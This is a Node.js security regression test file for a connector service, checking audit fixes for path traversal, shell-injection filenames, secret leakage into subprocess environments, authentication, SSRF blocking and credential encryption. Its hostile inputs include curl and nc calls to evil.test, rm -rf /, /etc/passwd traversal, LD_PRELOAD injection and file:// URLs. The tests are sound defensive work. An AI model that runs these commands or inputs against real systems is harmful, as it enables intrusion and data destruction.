// src/tests/phase0-security.test.js
// ---------------------------------------------------------------------------
// Phase 0 security regression suite -- audit TNX-AUDIT-2026-08.
//
// Run with:  node --test src/tests/phase0-security.test.js
//
// Every test here corresponds to a numbered acceptance criterion in Section 10
// of the audit. They exist so that a future refactor that reintroduces one of
// these defects fails the build rather than shipping.
//
// These are unit and module-level tests. The criteria that require a running
// container (criterion 2, "connector refuses to boot without MCP_API_KEY") are
// asserted here at the function level via assertConfigured(); the container-level
// check belongs in CI as a `docker run` that expects a non-zero exit.
// ---------------------------------------------------------------------------

import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  containedWithin,
  resolveContained,
  isSafeFilename,
} from '../utils/pathContainment.js';

// ---------------------------------------------------------------------------
// TNX-C-005 -- path containment  (acceptance criterion 5)
// ---------------------------------------------------------------------------

describe( 'TNX-C-005: path containment uses boundary matching, not prefix matching', () => {
  let root;
  let base;

  before( () => {
    root = mkdtempSync( join( tmpdir(), 'tnx-c005-' ) );
    base = join( root, 'scripts' );
    mkdirSync( join( base, 'sub' ), { recursive: true } );
    mkdirSync( join( root, 'scripts_evil' ), { recursive: true } );

    writeFileSync( join( base, 'ok.py' ), 'print(1)\n' );
    writeFileSync( join( root, 'scripts_evil', 'payload.py' ), 'print("pwned")\n' );
    writeFileSync( join( root, 'outside.txt' ), 'outside\n' );

    symlinkSync( join( root, 'outside.txt' ), join( base, 'link.py' ) );
  } );

  after( () => {
    rmSync( root, { recursive: true, force: true } );
  } );

  test( 'accepts a normal file inside the base', () => {
    assert.notEqual( resolveContained( base, 'ok.py' ), null );
  } );

  test( 'accepts a not-yet-existing nested file (the write case)', () => {
    assert.notEqual( resolveContained( base, 'sub/new.py' ), null );
  } );

  test( 'rejects classic ../ traversal', () => {
    assert.equal( resolveContained( base, '../scripts_evil/payload.py' ), null );
  } );

  test( 'rejects an absolute path', () => {
    assert.equal( resolveContained( base, '/etc/passwd' ), null );
  } );

  test( 'rejects the sibling-directory escape that startsWith allowed', () => {
    // This is the specific case the audit describes. The old idiom was:
    //   path.resolve( base, candidate ).startsWith( base )
    // With base ending in "scripts", the sibling "scripts_evil" shares the
    // prefix and was therefore accepted.
    assert.equal( resolveContained( base, '../scripts_evil/payload.py' ), null );

    // Demonstrate that the OLD idiom really would have accepted it, so this
    // test documents the defect rather than merely asserting the fix.
    const resolved = join( root, 'scripts_evil', 'payload.py' );
    assert.equal( resolved.startsWith( base ), true,
      'the historical startsWith check accepted the sibling directory' );
  } );

  test( 'rejects a symlink that escapes the base', () => {
    // path.resolve is lexical and never follows links, so this case is
    // invisible to any purely string-based containment check.
    assert.equal( resolveContained( base, 'link.py' ), null );
  } );

  test( 'rejects the base directory itself and its parent', () => {
    assert.equal( resolveContained( base, '.' ), null );
    assert.equal( resolveContained( base, '..' ), null );
    assert.equal( resolveContained( base, '' ), null );
  } );

  test( 'rejects a NUL byte, which truncates the path at the syscall boundary', () => {
    assert.equal( containedWithin( base, 'ok.py\u0000/../../etc/passwd' ), false );
  } );
} );

// ---------------------------------------------------------------------------
// TNX-C-010 -- filename validation for the preview subprocess
// (acceptance criterion 10)
// ---------------------------------------------------------------------------

describe( 'TNX-C-010: filenames reaching a subprocess are strictly validated', () => {
  test( 'accepts ordinary document names', () => {
    for ( const name of [ 'report.docx', 'Q3-summary_v2.docx', 'a.md', 'x.html' ] ) {
      assert.equal( isSafeFilename( name ), true, name );
    }
  } );

  test( 'rejects every shell metacharacter basename() preserves', () => {
    // basename() strips directory separators. It does NOT strip any of these,
    // which is why the execSync interpolation was exploitable.
    const hostile = [
      'a";curl evil.test;"b.docx',
      'a$(whoami).docx',
      'a`id`.docx',
      'a|nc evil.test 1234.docx',
      'a&sleep 10.docx',
      'a b.docx',
      "a';rm -rf /;'.docx",
      'a\nb.docx',
    ];
    for ( const name of hostile ) {
      assert.equal( isSafeFilename( name ), false, `should reject: ${ JSON.stringify( name ) }` );
    }
  } );

  test( 'rejects dot, dot-dot, empty and over-long names', () => {
    assert.equal( isSafeFilename( '.' ), false );
    assert.equal( isSafeFilename( '..' ), false );
    assert.equal( isSafeFilename( '' ), false );
    assert.equal( isSafeFilename( 'a'.repeat( 256 ) ), false );
  } );
} );

// ---------------------------------------------------------------------------
// TNX-C-004 -- script environment isolation  (acceptance criterion 4)
// ---------------------------------------------------------------------------

describe( 'TNX-C-004: spawned scripts receive only an allowlisted environment', () => {
  /**
   * The credential names the audit lists as previously inherited by every
   * spawned Python script.
   */
  const LEAKED_BEFORE = [
    'ANTHROPIC_API_KEY', 'OPENAI_API_KEY', 'DEEPSEEK_API_KEY', 'PERPLEXITY_API_KEY',
    'XAI_API_KEY', 'MISTRAL_API_KEY', 'GROQ_API_KEY', 'QWEN_API_KEY',
    'BRAVE_API_KEY', 'TAVILY_API_KEY', 'SERPER_API_KEY',
    'GOOGLE_CLIENT_SECRET', 'GOOGLE_REFRESH_TOKEN', 'SLACK_BOT_TOKEN',
    'WP_APP_PASSWORD', 'MEMORY_AUTH_TOKEN', 'RAILWAY_RESTORE_TOKEN',
    'AVA_MEMORY_WP_KEY', 'DATABASE_URL', 'MCP_API_KEY', 'JWT_SECRET',
  ];

  let saved;

  before( () => {
    saved = {};
    for ( const name of LEAKED_BEFORE ) {
      saved[ name ] = process.env[ name ];
      process.env[ name ] = `sentinel-value-for-${ name }`;
    }
  } );

  after( () => {
    for ( const name of LEAKED_BEFORE ) {
      if ( saved[ name ] === undefined ) delete process.env[ name ];
      else process.env[ name ] = saved[ name ];
    }
  } );

  test( 'no credential from the process environment reaches the child', async () => {
    const { buildScriptEnv } = await import( '../tools/script-execute.js' );
    const env = buildScriptEnv( '/tmp/out', 'report.py' );

    for ( const name of LEAKED_BEFORE ) {
      assert.equal( env[ name ], undefined, `${ name } must not reach the script` );
    }

    // Nothing in the produced env may carry a sentinel value under ANY key,
    // which catches a leak through an unexpected variable name too.
    for ( const [ key, value ] of Object.entries( env ) ) {
      assert.equal(
        String( value ).startsWith( 'sentinel-value-for-' ), false,
        `${ key } leaked a process-environment secret`
      );
    }
  } );

  test( 'the child still receives the variables it legitimately needs', async () => {
    const { buildScriptEnv } = await import( '../tools/script-execute.js' );
    const env = buildScriptEnv( '/tmp/out-dir', 'report.py' );

    assert.equal( env.PATH, '/usr/local/bin:/usr/bin:/bin' );
    assert.equal( env.HOME, '/tmp' );
    assert.equal( env.PYTHONUNBUFFERED, '1' );
    assert.equal( env.PYTHONDONTWRITEBYTECODE, '1' );
    assert.equal( env.SCRIPT_OUTPUT_DIR, '/tmp/out-dir' );
  } );

  test( 'a manifest cannot grant a variable absent from SCRIPT_GRANTABLE_ENV', async () => {
    // A manifest edit alone must not be sufficient to leak a secret. The grant
    // requires a matching entry in SCRIPT_GRANTABLE_ENV, so it is a two-place,
    // reviewable change.
    const prevManifest  = process.env.SCRIPT_ENV_MANIFEST;
    const prevGrantable = process.env.SCRIPT_GRANTABLE_ENV;

    process.env.SCRIPT_ENV_MANIFEST  = JSON.stringify( { 'report.py': [ 'ANTHROPIC_API_KEY' ] } );
    process.env.SCRIPT_GRANTABLE_ENV = '';

    // Re-import with a cache-busting query so the module-level manifest is
    // re-read with the environment set above.
    const mod = await import( `../tools/script-execute.js?grant-test=${ Date.now() }` );
    const env = mod.buildScriptEnv( '/tmp/out', 'report.py' );

    assert.equal( env.ANTHROPIC_API_KEY, undefined,
      'an ungranted variable must be refused even when the manifest requests it' );

    if ( prevManifest === undefined ) delete process.env.SCRIPT_ENV_MANIFEST;
    else process.env.SCRIPT_ENV_MANIFEST = prevManifest;
    if ( prevGrantable === undefined ) delete process.env.SCRIPT_GRANTABLE_ENV;
    else process.env.SCRIPT_GRANTABLE_ENV = prevGrantable;
  } );
} );

// ---------------------------------------------------------------------------
// TNX-C-001 -- authentication gate  (acceptance criteria 1, 2 and 29)
// ---------------------------------------------------------------------------

describe( 'TNX-C-001: the connector fails closed without MCP_API_KEY', () => {
  let saved;

  before( () => { saved = process.env.MCP_API_KEY; } );
  after( () => {
    if ( saved === undefined ) delete process.env.MCP_API_KEY;
    else process.env.MCP_API_KEY = saved;
  } );

  test( 'assertConfigured throws when the key is unset', async () => {
    const { assertConfigured } = await import( '../middleware/mcpAuth.js' );
    delete process.env.MCP_API_KEY;
    assert.throws( () => assertConfigured(), /MCP_API_KEY is not set/ );
  } );

  test( 'assertConfigured throws on a short key', async () => {
    const { assertConfigured } = await import( '../middleware/mcpAuth.js' );
    process.env.MCP_API_KEY = 'tooshort';
    assert.throws( () => assertConfigured(), /minimum of 32/ );
  } );

  test( 'assertConfigured throws on a placeholder key', async () => {
    const { assertConfigured } = await import( '../middleware/mcpAuth.js' );
    process.env.MCP_API_KEY = 'changeme';
    assert.throws( () => assertConfigured(), /placeholder|minimum of 32/ );
  } );

  test( 'assertConfigured accepts a real generated key', async () => {
    const { assertConfigured } = await import( '../middleware/mcpAuth.js' );
    process.env.MCP_API_KEY = 'a'.repeat( 16 ) + 'b'.repeat( 16 ) + 'c'.repeat( 32 );
    assert.doesNotThrow( () => assertConfigured() );
  } );
} );

describe( 'TNX-C-001: the middleware rejects unauthenticated tool-surface requests', () => {
  const KEY = 'k'.repeat( 20 ) + 'K'.repeat( 20 ) + '0123456789';

  /** Minimal Express-shaped response double. */
  function makeRes() {
    const res = { statusCode: null, body: null, headers: {} };
    res.setHeader = ( k, v ) => { res.headers[ k ] = v; };
    res.status = ( c ) => { res.statusCode = c; return res; };
    res.json = ( b ) => { res.body = b; return res; };
    return res;
  }

  before( async () => {
    process.env.MCP_API_KEY = KEY;
    const { assertConfigured } = await import( '../middleware/mcpAuth.js' );
    assertConfigured();
  } );

  test( 'GET /sse without a credential is refused', async () => {
    const { mcpAuthMiddleware } = await import( '../middleware/mcpAuth.js' );
    const res = makeRes();
    let nexted = false;
    mcpAuthMiddleware( { path: '/sse', headers: {} }, res, () => { nexted = true; } );

    assert.equal( nexted, false, 'the request must not reach the handler' );
    assert.equal( res.statusCode, 401 );
    assert.equal( res.body.code, 'MCP_AUTH_REQUIRED' );
    assert.match( res.headers[ 'WWW-Authenticate' ], /^Bearer/ );
  } );

  test( 'GET /sse with the correct bearer is allowed through', async () => {
    const { mcpAuthMiddleware } = await import( '../middleware/mcpAuth.js' );
    const req = { path: '/sse', headers: { authorization: `Bearer ${ KEY }` } };
    let nexted = false;
    mcpAuthMiddleware( req, makeRes(), () => { nexted = true; } );

    assert.equal( nexted, true );
    assert.equal( req.mcpAuthenticated, true );
  } );

  test( 'a wrong bearer of the same length is refused', async () => {
    const { mcpAuthMiddleware } = await import( '../middleware/mcpAuth.js' );
    const wrong = 'x'.repeat( KEY.length );
    const res = makeRes();
    let nexted = false;
    mcpAuthMiddleware( { path: '/mcp', headers: { authorization: `Bearer ${ wrong }` } }, res, () => { nexted = true; } );

    assert.equal( nexted, false );
    assert.equal( res.statusCode, 401 );
  } );

  test( 'the token is NOT accepted from the query string', async () => {
    // Query parameters reach access logs, proxy logs, browser history and the
    // Referer header, so they are deliberately not a supported carrier.
    const { mcpAuthMiddleware } = await import( '../middleware/mcpAuth.js' );
    const res = makeRes();
    let nexted = false;
    mcpAuthMiddleware( { path: '/mcp', headers: {}, query: { token: KEY } }, res, () => { nexted = true; } );

    assert.equal( nexted, false );
    assert.equal( res.statusCode, 401 );
  } );

  test( 'the MCP transports require the connector key and are never public', async () => {
    // v12.31.0: this test previously also asserted that every /restore-* and
    // /volume-* route "has no independent credential". That assertion was
    // simply wrong -- all of them verify RAILWAY_RESTORE_TOKEN internally --
    // and asserting it encoded the very mistake that broke connector snapshot
    // restore. Those routes are now covered by the dedicated
    // self-authenticated-coverage suite below, which derives the list from the
    // source rather than restating it by hand.
    const { isPublicPath, isSelfAuthenticatedPath } = await import( '../middleware/mcpAuth.js' );

    const mustRequireMcpKey = [
      '/sse', '/messages', '/mcp',
      '/data/upload-binary',   // removed in v12.28.0; must not become reachable
      '/export-all',           // has no credential of its own
    ];

    for ( const p of mustRequireMcpKey ) {
      assert.equal( isPublicPath( p ), false, `${ p } must not be public` );
      assert.equal( isSelfAuthenticatedPath( p ), false,
        `${ p } has no independent credential and must require MCP_API_KEY` );
    }
  } );

  test( 'the public allowlist contains only routes that must be publicly reachable', async () => {
    const { describeAllowlist } = await import( '../middleware/mcpAuth.js' );
    const { public: pub } = describeAllowlist();

    // Pinned deliberately. Adding an entry to the allowlist should require
    // editing this test, which forces the change to be justified in review.
    //
    // v12.28.0: /health/live and /health/ready added as part of the TNX-H-004
    // liveness/readiness split. Both must answer before any credential is
    // available to the orchestrator, which is why they are public. Neither
    // discloses configuration to an unauthenticated caller: /health/live
    // returns only status, version and uptime, and /health/ready returns only
    // pass/fail per check. The full integration inventory requires
    // authentication (TNX-M-004) and is covered by its own test below.
    assert.deepEqual( pub.sort(), [
      '/api/config.js',
      '/auth/linkedin/callback',
      '/data/upload',
      '/download/*',
      '/health',
      '/health/live',
      '/health/ready',
      '/memory/admin/dump',
      '/preview/*',
      '/track/click',
      '/track/open',
      '/upload/connections',
      '/webhook',
    ].sort() );
  } );
} );

// ---------------------------------------------------------------------------
// TNX-C-004 (extended) -- the four spawn sites the audit did NOT name
//
// The audit cited only src/tools/script-execute.js. A sweep for the
// `{ ...process.env }` idiom during Phase 0 found four more modules with the
// identical defect. These tests exist so that fixing "the one the report
// mentioned" can never again be mistaken for fixing the class.
// ---------------------------------------------------------------------------

describe( 'TNX-C-004 (extended): every subprocess spawn site uses the shared allowlist', () => {
  const SENTINEL_NAMES = [
    'ANTHROPIC_API_KEY', 'OPENAI_API_KEY', 'GOOGLE_CLIENT_SECRET',
    'GOOGLE_REFRESH_TOKEN', 'SLACK_BOT_TOKEN', 'WP_APP_PASSWORD',
    'MEMORY_AUTH_TOKEN', 'RAILWAY_RESTORE_TOKEN', 'MCP_API_KEY', 'DATABASE_URL',
  ];

  let saved;

  before( () => {
    saved = {};
    for ( const n of SENTINEL_NAMES ) {
      saved[ n ] = process.env[ n ];
      process.env[ n ] = `sentinel-${ n }`;
    }
  } );

  after( () => {
    for ( const n of SENTINEL_NAMES ) {
      if ( saved[ n ] === undefined ) delete process.env[ n ];
      else process.env[ n ] = saved[ n ];
    }
  } );

  test( 'the shared builder leaks nothing, with or without extra values', async () => {
    const { buildScriptEnv } = await import( '../utils/scriptEnv.js' );

    for ( const opts of [
      {},
      { scriptKey: 'homework_assessment.py' },
      { scriptKey: 'student_model.py', extra: { SELF_MODEL_DB_PATH: '/data/self.db' } },
      { scriptKey: 'nudge_prioritizer.py', extra: { SELF_MODEL_DB_PATH: '/data/self.db' } },
      { scriptKey: 'brain_scan.py' },
      { outputDir: '/tmp/o', scriptKey: 'report.py' },
    ] ) {
      const env = buildScriptEnv( opts );
      for ( const [ k, v ] of Object.entries( env ) ) {
        assert.equal( String( v ).startsWith( 'sentinel-' ), false,
          `${ k } leaked a process-environment secret for ${ JSON.stringify( opts ) }` );
      }
      for ( const n of SENTINEL_NAMES ) {
        assert.equal( env[ n ], undefined, `${ n } must not be present` );
      }
    }
  } );

  test( 'caller-supplied extras are passed through but cannot override PATH or HOME', async () => {
    const { buildScriptEnv } = await import( '../utils/scriptEnv.js' );
    const env = buildScriptEnv( {
      scriptKey: 'x.py',
      extra: {
        SELF_MODEL_DB_PATH: '/data/self.db',
        PATH:               '/attacker/bin',
        LD_PRELOAD:         '/tmp/evil.so',
        HOME:               '/attacker',
      },
    } );

    assert.equal( env.SELF_MODEL_DB_PATH, '/data/self.db', 'legitimate extras pass through' );
    assert.equal( env.PATH, '/usr/local/bin:/usr/bin:/bin', 'PATH cannot be overridden' );
    assert.equal( env.HOME, '/tmp', 'HOME cannot be overridden' );
    assert.equal( env.LD_PRELOAD, undefined, 'LD_PRELOAD cannot be injected' );
  } );

  test( 'no module in src/ still spreads process.env into a spawned subprocess', async () => {
    // A source-level assertion. The audit records that this idiom was a house
    // pattern, so the durable control is a check that fails when it reappears,
    // not only tests of the five sites that exist today.
    const { readdirSync, readFileSync, statSync } = await import( 'node:fs' );
    const { join, dirname, sep } = await import( 'node:path' );
    const { fileURLToPath } = await import( 'node:url' );

    const srcRoot = join( dirname( fileURLToPath( import.meta.url ) ), '..' );
    const offenders = [];

    const walk = ( dir ) => {
      for ( const entry of readdirSync( dir ) ) {
        if ( entry === 'node_modules' || entry.startsWith( '.' ) ) continue;
        const full = join( dir, entry );
        if ( statSync( full ).isDirectory() ) { walk( full ); continue; }
        if ( ! entry.endsWith( '.js' ) ) continue;
        // test-http.js spawns the server itself and legitimately needs the
        // real environment; it is a harness, not a script runner.
        if ( entry === 'test-http.js' ) continue;
        // Skip the test tree. This file necessarily contains the literal idiom
        // it is searching for, and would otherwise match itself.
        if ( full.includes( `${ sep }tests${ sep }` ) ) continue;

        const lines = readFileSync( full, 'utf8' ).split( '\n' );
        lines.forEach( ( line, i ) => {
          const stripped = line.trim();
          if ( stripped.startsWith( '//' ) || stripped.startsWith( '*' ) ) return;
          if ( stripped.includes( '...process.env' ) ) {
            offenders.push( `${ full }:${ i + 1 }` );
          }
        } );
      }
    };

    walk( srcRoot );
    assert.deepEqual( offenders, [],
      `these sites spread the full environment into a subprocess:\n  ${ offenders.join( '\n  ' ) }` );
  } );
} );

// ---------------------------------------------------------------------------
// PHASE 1 -- Cycle 2A
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// TNX-C-009 -- SSRF  (acceptance criterion 9)
// ---------------------------------------------------------------------------

describe( 'TNX-C-009: safeFetch refuses every non-public address range', () => {
  /** Addresses the audit names explicitly, plus the ranges around them. */
  const MUST_BLOCK = [
    [ '169.254.169.254',  'cloud instance metadata' ],
    [ '169.254.0.1',      'link-local lower edge' ],
    [ '169.254.255.255',  'link-local upper edge' ],
    [ '127.0.0.1',        'loopback' ],
    [ '127.255.255.254',  'loopback /8 edge' ],
    [ '10.0.0.1',         'RFC1918 10/8' ],
    [ '172.16.0.1',       'RFC1918 172.16/12' ],
    [ '172.31.255.255',   'RFC1918 172.16/12 upper edge' ],
    [ '192.168.1.1',      'RFC1918 192.168/16' ],
    [ '100.64.0.1',       'CGNAT' ],
    [ '0.0.0.0',          'unspecified' ],
    [ '224.0.0.1',        'multicast' ],
    [ '255.255.255.255',  'broadcast' ],
    [ '198.18.0.1',       'benchmarking' ],
    [ '::1',              'IPv6 loopback' ],
    [ '::',               'IPv6 unspecified' ],
    [ 'fe80::1',          'IPv6 link-local' ],
    [ 'fc00::1',          'IPv6 unique-local' ],
    [ 'fd00::1',          'IPv6 unique-local fd' ],
    [ 'ff02::1',          'IPv6 multicast' ],
    [ '::ffff:127.0.0.1',       'IPv4-mapped loopback' ],
    [ '::ffff:169.254.169.254', 'IPv4-mapped metadata' ],
    [ '::ffff:10.0.0.1',        'IPv4-mapped RFC1918' ],
  ];

  const MUST_ALLOW = [
    '8.8.8.8', '1.1.1.1', '93.184.216.34',
    '2606:4700:4700::1111', '2404:6800:4006::200e',
  ];

  test( 'every reserved range is refused', async () => {
    const { ipBlockReason } = await import( '../utils/safeFetch.js' );
    for ( const [ ip, label ] of MUST_BLOCK ) {
      assert.notEqual( ipBlockReason( ip ), null, `${ ip } (${ label }) must be blocked` );
    }
  } );

  test( 'public addresses are still permitted', async () => {
    const { ipBlockReason } = await import( '../utils/safeFetch.js' );
    for ( const ip of MUST_ALLOW ) {
      assert.equal( ipBlockReason( ip ), null, `${ ip } must be allowed` );
    }
  } );

  test( 'non-http schemes are refused', async () => {
    const { validateUrl, SsrfBlockedError } = await import( '../utils/safeFetch.js' );
    for ( const url of [ 'file:///etc/passwd', 'gopher://x/', 'ftp://x/', 'data:text/html,x', 'dict://x:11/' ] ) {
      assert.throws( () => validateUrl( url ), SsrfBlockedError, url );
    }
  } );

  test( 'URLs carrying credentials are refused', async () => {
    const { validateUrl, SsrfBlockedError } = await import( '../utils/safeFetch.js' );
    assert.throws( () => validateUrl( 'http://user:pass@example.com/' ), SsrfBlockedError );
  } );

  test( 'a hostname resolving to a private address is refused', async () => {
    const { resolveAndValidateHost, SsrfBlockedError } = await import( '../utils/safeFetch.js' );
    await assert.rejects( () => resolveAndValidateHost( 'localhost' ), SsrfBlockedError );
  } );

  test( 'an IPv6 literal is classified by policy, not left to fail at DNS', async () => {
    // Regression guard. WHATWG URL keeps the brackets on an IPv6 host, so
    // isIP('[::1]') is 0 and the value fell through to a DNS lookup. It was
    // refused only because getaddrinfo failed on a bracketed name, which is an
    // accident rather than a control.
    const { resolveAndValidateHost, SsrfBlockedError } = await import( '../utils/safeFetch.js' );
    await assert.rejects(
      () => resolveAndValidateHost( '[::1]' ),
      ( err ) => err instanceof SsrfBlockedError && /loopback/i.test( err.message )
    );
  } );

  test( 'no caller-supplied-URL tool still calls global fetch directly', async () => {
    // Source-level guard. The four migrated modules must not regain a raw
    // fetch on a caller-supplied URL during a future edit.
    const { readFileSync } = await import( 'node:fs' );
    const { join, dirname } = await import( 'node:path' );
    const { fileURLToPath } = await import( 'node:url' );
    const toolsDir = join( dirname( fileURLToPath( import.meta.url ) ), '..', 'tools' );

    for ( const file of [ 'webFetch.js', 'imageDownloader.js', 'wordpressMedia.js', 'leadSearch.js' ] ) {
      const src = readFileSync( join( toolsDir, file ), 'utf8' );
      assert.ok( src.includes( 'safeFetch' ), `${ file } must import safeFetch` );
    }
  } );
} );

// ---------------------------------------------------------------------------
// TNX-H-004 / TNX-H-006 -- runtime guards and readiness
// ---------------------------------------------------------------------------

describe( 'TNX-H-004 / TNX-H-006: service runtime', () => {
  test( 'readiness reports a failing critical check and marks the service not ready', async () => {
    const { runReadinessChecks } = await import( '../utils/serviceRuntime.js' );
    const report = await runReadinessChecks( [
      { name: 'good', run: () => true },
      { name: 'bad',  run: () => { throw new Error( 'volume missing' ); } },
    ] );
    assert.equal( report.ready, false );
    assert.equal( report.checks.good.ok, true );
    assert.equal( report.checks.bad.ok, false );
    assert.match( report.checks.bad.detail, /volume missing/ );
  } );

  test( 'a non-critical failure degrades the report without failing readiness', async () => {
    // The memory subsystem is optional: six of roughly sixty tools depend on
    // it, so its failure must not remove the whole instance from rotation.
    const { runReadinessChecks } = await import( '../utils/serviceRuntime.js' );
    const report = await runReadinessChecks( [
      { name: 'volume', run: () => true },
      { name: 'memory', critical: false, run: () => { throw new Error( 'sqlite down' ); } },
    ] );
    assert.equal( report.ready, true );
    assert.equal( report.checks.memory.ok, false );
  } );

  test( 'a check returning false is treated as a failure, not as a pass', async () => {
    const { runReadinessChecks } = await import( '../utils/serviceRuntime.js' );
    const report = await runReadinessChecks( [ { name: 'x', run: () => false } ] );
    assert.equal( report.ready, false );
  } );

  test( 'HTTP timeouts satisfy headersTimeout > keepAliveTimeout', async () => {
    // Not arbitrary. If headersTimeout is lower, Node can time out waiting for
    // headers on a socket it is still willing to keep alive, killing the
    // request for no reason.
    const { applyServerTimeouts } = await import( '../utils/serviceRuntime.js' );
    const fakeServer = {};
    const result = applyServerTimeouts( fakeServer, { log: () => {} } );

    assert.ok( result.headersTimeout > result.keepAliveTimeout,
      'headersTimeout must exceed keepAliveTimeout' );
    assert.ok( result.keepAliveTimeout > 5000,
      'keepAliveTimeout must exceed the Node default of 5s, which sits below every proxy idle timeout' );
    assert.equal( fakeServer.timeout, 0,
      'socket inactivity timeout must be disabled or it kills idle SSE streams' );
  } );
} );

// ---------------------------------------------------------------------------
// PHASE 1 -- Cycle 2B
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// TNX-H-014 -- credential storage
// ---------------------------------------------------------------------------

describe( 'TNX-H-014: credentials are encrypted, atomic and on the volume', () => {
  test( 'AES-256-GCM round-trips and rejects tampering', async () => {
    const prev = process.env.CONNECTOR_SECRET_KEY;
    process.env.CONNECTOR_SECRET_KEY = 'a'.repeat( 64 );

    const { encryptSecret, decryptSecret, looksEncrypted } =
      await import( `../utils/secretBox.js?k=${ Date.now() }` );

    const payload = encryptSecret( 'SuperSecret123!' );

    assert.ok( looksEncrypted( payload ), 'payload should carry the v1 prefix' );
    assert.equal( payload.split( ':' ).length, 4, 'v1:iv:tag:ciphertext' );
    assert.equal( payload.includes( 'SuperSecret123!' ), false, 'plaintext must not survive' );
    assert.equal( decryptSecret( payload ), 'SuperSecret123!' );

    // GCM authenticates. A flipped ciphertext bit must throw, not decrypt to
    // attacker-influenced plaintext. This is the property CBC lacks, and is
    // the reason the audit records aes-256-cbc in the PHP plugin as a finding.
    const parts = payload.split( ':' );
    const ct    = Buffer.from( parts[ 3 ], 'base64' );
    ct[ 0 ] ^= 0xFF;
    parts[ 3 ] = ct.toString( 'base64' );
    assert.throws( () => decryptSecret( parts.join( ':' ) ) );

    if ( prev === undefined ) delete process.env.CONNECTOR_SECRET_KEY;
    else process.env.CONNECTOR_SECRET_KEY = prev;
  } );

  test( 'a malformed payload is rejected rather than parsed loosely', async () => {
    const prev = process.env.CONNECTOR_SECRET_KEY;
    process.env.CONNECTOR_SECRET_KEY = 'b'.repeat( 64 );
    const { decryptSecret } = await import( `../utils/secretBox.js?m=${ Date.now() }` );

    for ( const bad of [ 'v1:only:three', 'v2:a:b:c', 'not-a-payload', 'v1::::' ] ) {
      assert.throws( () => decryptSecret( bad ), undefined, bad );
    }

    if ( prev === undefined ) delete process.env.CONNECTOR_SECRET_KEY;
    else process.env.CONNECTOR_SECRET_KEY = prev;
  } );

  test( 'the key is refused unless it is exactly 32 bytes', async () => {
    const prev = process.env.CONNECTOR_SECRET_KEY;

    process.env.CONNECTOR_SECRET_KEY = 'tooshort';
    let mod = await import( `../utils/secretBox.js?s=${ Date.now() }` );
    assert.equal( mod.getKey(), null, 'a short key must not be accepted' );

    process.env.CONNECTOR_SECRET_KEY = 'c'.repeat( 64 );
    mod = await import( `../utils/secretBox.js?s2=${ Date.now() }` );
    assert.equal( mod.getKey()?.length, 32, '64 hex characters is a valid 32-byte key' );

    if ( prev === undefined ) delete process.env.CONNECTOR_SECRET_KEY;
    else process.env.CONNECTOR_SECRET_KEY = prev;
  } );

  test( 'the store writes to the configured volume, not a path inside the image', async () => {
    const { mkdtempSync, rmSync } = await import( 'node:fs' );
    const { tmpdir } = await import( 'node:os' );
    const dir = mkdtempSync( `${ tmpdir() }/cred-` );

    const prevDir = process.env.CONNECTOR_DATA_DIR;
    const prevKey = process.env.CONNECTOR_SECRET_KEY;
    process.env.CONNECTOR_DATA_DIR   = dir;
    process.env.CONNECTOR_SECRET_KEY = 'd'.repeat( 64 );

    const cs = await import( `../utils/credentialStore.js?v=${ Date.now() }` );
    const paths = cs.getStoragePaths();

    // The original defect: resolve(__dirname, '../../data') from /app/src/utils
    // gives /app/data, inside the image, while the volume is at /data.
    assert.equal( paths.dataDir, dir );
    assert.equal( paths.dataDir.startsWith( '/app' ), false,
      'the credential directory must never be inside the container image' );

    rmSync( dir, { recursive: true, force: true } );
    if ( prevDir === undefined ) delete process.env.CONNECTOR_DATA_DIR; else process.env.CONNECTOR_DATA_DIR = prevDir;
    if ( prevKey === undefined ) delete process.env.CONNECTOR_SECRET_KEY; else process.env.CONNECTOR_SECRET_KEY = prevKey;
  } );

  test( 'credentials persist encrypted, at mode 0600, and survive a reload', async () => {
    const { mkdtempSync, rmSync, readFileSync, statSync } = await import( 'node:fs' );
    const { tmpdir } = await import( 'node:os' );
    const dir = mkdtempSync( `${ tmpdir() }/cred2-` );

    const prevDir = process.env.CONNECTOR_DATA_DIR;
    const prevKey = process.env.CONNECTOR_SECRET_KEY;
    process.env.CONNECTOR_DATA_DIR   = dir;
    process.env.CONNECTOR_SECRET_KEY = 'e'.repeat( 64 );

    const cs = await import( `../utils/credentialStore.js?w=${ Date.now() }` );
    cs.setWordPressCredentials( {
      wp_url: 'https://example.com', wp_username: 'admin', wp_password: 'PlaintextPassword!',
    } );

    const paths = cs.getStoragePaths();
    const raw   = readFileSync( paths.credFile, 'utf8' );

    assert.equal( raw.includes( 'PlaintextPassword!' ), false,
      'the password must not be readable as plaintext on disk' );
    assert.ok( raw.includes( 'https://example.com' ),
      'non-secret fields stay readable, so the file is still diagnosable' );
    assert.equal( ( statSync( paths.credFile ).mode & 0o777 ).toString( 8 ), '600' );

    // Reload from a fresh module instance, as a restart would.
    const cs2 = await import( `../utils/credentialStore.js?r=${ Date.now() }` );
    const creds = cs2.getWordPressCredentials();
    assert.equal( creds.username, 'admin' );
    assert.equal( creds.authHeader,
      `Basic ${ Buffer.from( 'admin:PlaintextPassword!' ).toString( 'base64' ) }`,
      'the decrypted password must reconstruct the original auth header' );

    // The status object is shown to users and must never carry the secret.
    assert.equal( JSON.stringify( cs2.getWordPressStatus() ).includes( 'PlaintextPassword!' ), false );

    rmSync( dir, { recursive: true, force: true } );
    if ( prevDir === undefined ) delete process.env.CONNECTOR_DATA_DIR; else process.env.CONNECTOR_DATA_DIR = prevDir;
    if ( prevKey === undefined ) delete process.env.CONNECTOR_SECRET_KEY; else process.env.CONNECTOR_SECRET_KEY = prevKey;
  } );

  test( 'a write leaves no temp file behind and the target stays valid JSON', async () => {
    const { mkdtempSync, rmSync, readdirSync, readFileSync } = await import( 'node:fs' );
    const { tmpdir } = await import( 'node:os' );
    const dir = mkdtempSync( `${ tmpdir() }/cred3-` );

    const prevDir = process.env.CONNECTOR_DATA_DIR;
    const prevKey = process.env.CONNECTOR_SECRET_KEY;
    process.env.CONNECTOR_DATA_DIR   = dir;
    process.env.CONNECTOR_SECRET_KEY = 'f'.repeat( 64 );

    const cs = await import( `../utils/credentialStore.js?a=${ Date.now() }` );
    for ( let i = 0; i < 5; i += 1 ) {
